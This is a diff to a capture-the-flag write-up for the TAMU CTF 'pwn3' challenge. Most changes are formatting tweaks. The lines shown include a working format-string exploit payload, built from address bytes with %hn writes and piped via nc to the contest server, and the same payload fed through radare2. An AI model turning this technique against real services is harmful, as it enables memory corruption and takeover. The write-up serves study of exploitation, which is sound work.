@@ -3,7 +3,7 @@
 
 ![Pwn3 challenge description](assets/1-pwn3_description.png)
 
-Here we are, with another pwning challenge. Let's start ^^.
+Here we are, with another pwning challenge. Let's start :grin:.
 
 ```bash
 $ wget https://ctf.tamu.edu/files/e02cea87728137d5da449db45dcb875e/pwn3
@@ -187,7 +187,7 @@ $ python -c 'print("\x1e\xa0\x04\x08" + "\x1c\xa0\x04\x08" + "%2044x" + "%4$hn" 
 Finally! lets try it!
 
 ```bash
-python -c 'print("\x1e\xa0\x04\x08" + "\x1c\xa0\x04\x08" + "%2044x" + "%4$hn" + "%32167x" + "%5$hn")' | nc pwn.ctf.tamu.edu 4323
+$ python -c 'print("\x1e\xa0\x04\x08" + "\x1c\xa0\x04\x08" + "%2044x" + "%4$hn" + "%32167x" + "%5$hn")' | nc pwn.ctf.tamu.edu 4323
 ```
 
 ![Pwn3 Scheme](assets/13-pwn3_getting_the_flag.png)    
@@ -200,8 +200,10 @@ Answer: gigem{F0RM@1NG_1S_H4RD}
 
 
 ### Notes for the author
-r2 -X "stdin=\"\`python -c 'print(\"\x1e\xa0\x04\x08\x1c\xa0\x04\x08\" + \"%2044x%4$hn\" + \"%32167x%5$hn\")'\`\"" -d pwn3
 
+```bash
+$ r2 -X "stdin=\"`python -c 'print(\"\x1e\xa0\x04\x08\x1c\xa0\x04\x08\" + \"%2044x%4$hn\" + \"%32167x%5$hn\")'`\"" -d pwn3
+```
 
 ### Tools used and some references:
 
